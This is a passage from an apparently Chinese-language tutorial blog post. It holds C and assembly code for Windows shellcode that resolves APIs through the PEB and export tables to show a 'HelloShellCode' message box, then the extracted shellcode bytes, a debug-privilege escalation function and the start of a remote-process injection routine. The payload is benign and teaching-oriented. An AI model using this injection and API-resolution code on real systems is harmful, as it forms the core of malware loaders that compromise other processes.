class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szGetProcAddress[] = &#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szLoadLibrary[] = &#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szMessageBoxA[] = &#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> szHelloShellCode[] = &#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		push eax;</span><br><span class="line">		mov eax, fs:[<span class="number">30</span>h];	<span class="comment">//eax 指向PEB</span></span><br><span class="line">		mov eax, [eax+<span class="number">0xc</span>]	<span class="comment">//eax 指向PEB_LDR_DATA </span></span><br><span class="line">		mov Ldr, eax;</span><br><span class="line">		pop eax;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//(1) Find kernel32.dll</span></span><br><span class="line">	PCHAR pDllName = <span class="literal">NULL</span>;</span><br><span class="line">	PCHAR pKernel = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL bGet = FALSE;	</span><br><span class="line">	PVOID pDllBase = <span class="literal">NULL</span>;</span><br><span class="line">	Ldte = (PLDR_DATA_TABLE_ENTRY)Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">	Head = Ldte;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		Ldte = (PLDR_DATA_TABLE_ENTRY)Ldte-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">		pKernel = szKernel32;</span><br><span class="line">		pDllName = (PCHAR)Ldte-&gt;BaseDllName.Buffer;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(TOUPPER(*pDllName) != TOUPPER(*pKernel))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(*(PWORD)pDllName == <span class="literal">NULL</span> &amp;&amp; *(PWORD)pKernel == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bGet = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pDllName = (PCHAR)((DWORD)pDllName + <span class="number">1</span>);</span><br><span class="line">			pKernel = (PCHAR)((DWORD)pKernel + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(bGet == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			pDllBase = (LPVOID)Ldte-&gt;DllBase;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(Head != Ldte);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(bGet != TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Get GetProcAddress Fuctions Address</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((DWORD)pPEHeader + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pOptionHeader-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line">	</span><br><span class="line">	PDWORD AddressOfFunctions = (PDWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PDWORD AddressOfNames = (PDWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PWORD AddressOfNameOridinals = (PWORD)((DWORD)pDosHeader + pExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		bGet = FALSE;</span><br><span class="line">		PCHAR pFunName = (PCHAR)((DWORD)pDllBase + AddressOfNames[i]);</span><br><span class="line">		PCHAR pGetProcAddr = szGetProcAddress;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(*pFunName != *pGetProcAddr)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(*pFunName == <span class="literal">NULL</span> &amp;&amp; *pGetProcAddr == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				bGet = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pFunName = (PCHAR)((DWORD)pFunName + <span class="number">1</span>);</span><br><span class="line">			pGetProcAddr = (PCHAR)((DWORD)pGetProcAddr + <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(bGet == TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			pGetProcAddress = (PGETPROCADDRESS)(AddressOfFunctions[AddressOfNameOridinals[i]] + (DWORD)pDllBase);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Get Address</span></span><br><span class="line">	pLoadLibraryA = (PLOADLIBRARYA)pGetProcAddress((HMODULE)pDllBase,szLoadLibrary);</span><br><span class="line">	pMessageBoxA = (PMESSAGEBOXA)pGetProcAddress(pLoadLibraryA(szUser32),szMessageBoxA);</span><br><span class="line">	pMessageBoxA(<span class="number">0</span>,szHelloShellCode,<span class="number">0</span>,MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将函数<code>DWORD WINAPI ShellCode(LPVOID lpThreadParameter);</code>的硬编码提取出来。然后注入到某个进程中去：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = </span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x83</span>,<span class="number">0xEC</span>,<span class="number">0x7C</span>,<span class="number">0x53</span>,<span class="number">0x33</span>,<span class="number">0xDB</span>,<span class="number">0xB0</span>,<span class="number">0x65</span>,<span class="number">0xB1</span>,<span class="number">0x6C</span>,<span class="number">0xB2</span>,<span class="number">0x64</span>,<span class="number">0x56</span>,</span><br><span class="line">	<span class="number">0x57</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF8</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF4</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x84</span>,<span class="number">0x6B</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x85</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x86</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x87</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x88</span>,<span class="number">0x72</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x89</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x8A</span>,<span class="number">0x6E</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x5D</span>,<span class="number">0x8B</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0x8C</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x8D</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0x8E</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x8F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x90</span>,<span class="number">0x33</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x91</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x92</span>,<span class="number">0x32</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x93</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0x94</span>,<span class="number">0x2E</span>,</span><br><span class="line">	<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x95</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0x96</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x97</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0x98</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x99</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0x9A</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9B</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9C</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0x9D</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDC</span>,<span class="number">0x75</span>,<span class="number">0xC6</span>,</span><br><span class="line">	<span class="number">0x45</span>,<span class="number">0xDD</span>,<span class="number">0x73</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xDE</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDF</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE0</span>,<span class="number">0x33</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xE1</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE2</span>,<span class="number">0x2E</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xE3</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xE4</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xE5</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x5D</span>,<span class="number">0xE6</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA0</span>,<span class="number">0x47</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xA1</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA2</span>,<span class="number">0x74</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA3</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA4</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA5</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA6</span>,<span class="number">0x63</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xA7</span>,</span><br><span class="line">	<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xA8</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xA9</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAA</span>,<span class="number">0x72</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xAB</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xAC</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xAD</span>,<span class="number">0x73</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xAE</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC0</span>,<span class="number">0x4C</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC1</span>,</span><br><span class="line">	<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC2</span>,<span class="number">0x61</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xC3</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC4</span>,<span class="number">0x4C</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC5</span>,<span class="number">0x69</span>,</span><br><span class="line">	<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC6</span>,<span class="number">0x62</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC7</span>,<span class="number">0x72</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC8</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xC9</span>,<span class="number">0x72</span>,</span><br><span class="line">	<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCA</span>,<span class="number">0x79</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xCB</span>,<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xCC</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD0</span>,<span class="number">0x4D</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x45</span>,<span class="number">0xD1</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD2</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD3</span>,<span class="number">0x73</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD4</span>,<span class="number">0x61</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xD5</span>,<span class="number">0x67</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xD6</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD7</span>,<span class="number">0x42</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD8</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xD9</span>,</span><br><span class="line">	<span class="number">0x78</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDA</span>,<span class="number">0x41</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xDB</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB0</span>,<span class="number">0x48</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xB1</span>,<span class="number">0x88</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0xB2</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB3</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB4</span>,<span class="number">0x6F</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB5</span>,<span class="number">0x53</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xB6</span>,</span><br><span class="line">	<span class="number">0x68</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xB7</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB8</span>,<span class="number">0x88</span>,<span class="number">0x4D</span>,<span class="number">0xB9</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xBA</span>,<span class="number">0x43</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xBB</span>,<span class="number">0x6F</span>,<span class="number">0x88</span>,<span class="number">0x55</span>,<span class="number">0xBC</span>,<span class="number">0x88</span>,<span class="number">0x45</span>,<span class="number">0xBD</span>,<span class="number">0x88</span>,<span class="number">0x5D</span>,<span class="number">0xBE</span>,<span class="number">0x50</span>,<span class="number">0x64</span>,<span class="number">0xA1</span>,<span class="number">0x30</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x0C</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x58</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x70</span>,<span class="number">0x0C</span>,<span class="number">0x89</span>,</span><br><span class="line">	<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x36</span>,<span class="number">0x8D</span>,<span class="number">0x7D</span>,<span class="number">0x84</span>,<span class="number">0x8B</span>,<span class="number">0x4E</span>,<span class="number">0x30</span>,<span class="number">0x2B</span>,<span class="number">0xF9</span>,<span class="number">0x8A</span>,<span class="number">0x01</span>,<span class="number">0x3C</span>,<span class="number">0x61</span>,</span><br><span class="line">	<span class="number">0x7C</span>,<span class="number">0x0C</span>,<span class="number">0x3C</span>,<span class="number">0x7A</span>,<span class="number">0x7F</span>,<span class="number">0x08</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xD0</span>,<span class="number">0x83</span>,<span class="number">0xEA</span>,<span class="number">0x20</span>,<span class="number">0xEB</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,</span><br><span class="line">	<span class="number">0xD0</span>,<span class="number">0x8A</span>,<span class="number">0x04</span>,<span class="number">0x0F</span>,<span class="number">0x3C</span>,<span class="number">0x61</span>,<span class="number">0x7C</span>,<span class="number">0x0C</span>,<span class="number">0x3C</span>,<span class="number">0x7A</span>,<span class="number">0x7F</span>,<span class="number">0x08</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xC0</span>,<span class="number">0x83</span>,</span><br><span class="line">	<span class="number">0xE8</span>,<span class="number">0x20</span>,<span class="number">0xEB</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0xBE</span>,<span class="number">0xC0</span>,<span class="number">0x3B</span>,<span class="number">0xD0</span>,<span class="number">0x75</span>,<span class="number">0x0E</span>,<span class="number">0x66</span>,<span class="number">0x39</span>,<span class="number">0x19</span>,<span class="number">0x75</span>,<span class="number">0x06</span>,</span><br><span class="line">	<span class="number">0x66</span>,<span class="number">0x39</span>,<span class="number">0x1C</span>,<span class="number">0x0F</span>,<span class="number">0x74</span>,<span class="number">0x0E</span>,<span class="number">0x41</span>,<span class="number">0xEB</span>,<span class="number">0xC3</span>,<span class="number">0x39</span>,<span class="number">0x75</span>,<span class="number">0xF8</span>,<span class="number">0x0F</span>,<span class="number">0x84</span>,<span class="number">0xA5</span>,<span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xEB</span>,<span class="number">0xAE</span>,<span class="number">0x8B</span>,<span class="number">0x76</span>,<span class="number">0x18</span>,<span class="number">0x89</span>,<span class="number">0x5D</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x4E</span>,<span class="number">0x3C</span>,<span class="number">0x8B</span>,<span class="number">0x44</span>,<span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0x78</span>,<span class="number">0x8B</span>,<span class="number">0x4C</span>,<span class="number">0x30</span>,<span class="number">0x1C</span>,<span class="number">0x03</span>,<span class="number">0xC6</span>,<span class="number">0x03</span>,<span class="number">0xCE</span>,<span class="number">0x89</span>,<span class="number">0x4D</span>,<span class="number">0xE8</span>,<span class="number">0x8B</span>,<span class="number">0x48</span>,<span class="number">0x20</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x50</span>,<span class="number">0x24</span>,<span class="number">0x8B</span>,<span class="number">0x40</span>,<span class="number">0x18</span>,<span class="number">0x03</span>,<span class="number">0xCE</span>,<span class="number">0x03</span>,<span class="number">0xD6</span>,<span class="number">0x3B</span>,<span class="number">0xC3</span>,<span class="number">0x89</span>,<span class="number">0x55</span>,<span class="number">0xEC</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0xF0</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x89</span>,<span class="number">0x4D</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x02</span>,<span class="number">0x8D</span>,<span class="number">0x55</span>,<span class="number">0xA0</span>,<span class="number">0x8D</span>,<span class="number">0x3C</span>,</span><br><span class="line">	<span class="number">0x06</span>,<span class="number">0x2B</span>,<span class="number">0xD7</span>,<span class="number">0x8A</span>,<span class="number">0x0F</span>,<span class="number">0x8A</span>,<span class="number">0x04</span>,<span class="number">0x3A</span>,<span class="number">0x3A</span>,<span class="number">0xC8</span>,<span class="number">0x75</span>,<span class="number">0x0B</span>,<span class="number">0x3A</span>,<span class="number">0xCB</span>,<span class="number">0x75</span>,<span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x3A</span>,<span class="number">0xC3</span>,<span class="number">0x74</span>,<span class="number">0x1C</span>,<span class="number">0x47</span>,<span class="number">0xEB</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x8B</span>,<span class="number">0x4D</span>,<span class="number">0xF0</span>,</span><br><span class="line">	<span class="number">0x40</span>,<span class="number">0x83</span>,<span class="number">0xC2</span>,<span class="number">0x04</span>,<span class="number">0x3B</span>,<span class="number">0xC1</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x89</span>,<span class="number">0x55</span>,<span class="number">0xFC</span>,<span class="number">0x73</span>,<span class="number">0x19</span>,<span class="number">0xEB</span>,<span class="number">0xC6</span>,</span><br><span class="line">	<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x33</span>,<span class="number">0xC9</span>,<span class="number">0x66</span>,<span class="number">0x8B</span>,<span class="number">0x0C</span>,<span class="number">0x42</span>,<span class="number">0x8B</span>,<span class="number">0x55</span>,<span class="number">0xE8</span>,<span class="number">0x8B</span>,</span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x8A</span>,<span class="number">0x03</span>,<span class="number">0xC6</span>,<span class="number">0x89</span>,<span class="number">0x45</span>,<span class="number">0xF4</span>,<span class="number">0x8D</span>,<span class="number">0x45</span>,<span class="number">0xC0</span>,<span class="number">0x50</span>,<span class="number">0x56</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0xF4</span>,<span class="number">0xFF</span>,</span><br><span class="line">	<span class="number">0xD6</span>,<span class="number">0x8D</span>,<span class="number">0x4D</span>,<span class="number">0xDC</span>,<span class="number">0x51</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x8D</span>,<span class="number">0x55</span>,<span class="number">0xD0</span>,<span class="number">0x52</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0xD6</span>,<span class="number">0x53</span>,<span class="number">0x8D</span>,</span><br><span class="line">	<span class="number">0x4D</span>,<span class="number">0xB0</span>,<span class="number">0x53</span>,<span class="number">0x51</span>,<span class="number">0x53</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x5F</span>,<span class="number">0x5E</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x5B</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span>,<span class="number">0x5D</span>,<span class="number">0xC2</span>,</span><br><span class="line">	<span class="number">0x04</span>,<span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line"><span class="comment">// 提权函数：提升为DEBUG权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	BOOL fOk=FALSE;</span><br><span class="line">	<span class="keyword">if</span>(OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp;</span><br><span class="line">		tp.PrivilegeCount=<span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line">		</span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes=SE_PRIVILEGE_ENABLED;</span><br><span class="line">		AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">		</span><br><span class="line">		fOk=(GetLastError()==ERROR_SUCCESS);</span><br><span class="line">		CloseHandle(hToken);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> fOk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//DWORD dwOldProtect;</span></span><br><span class="line">	<span class="comment">//VirtualProtect(ShellCode,0x1000,PAGE_EXECUTE_READWRITE,&amp;dwOldProtect);</span></span><br><span class="line">	EnableDebugPrivilege();</span><br><span class="line">	DWORD dwWritten;</span><br><span class="line">	DWORD pid;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要注入的进程PID: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;pid);</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);</span><br><span class="line">	PVOID pAddr = VirtualAllocEx(hProcess,<span class="number">0</span>,<span 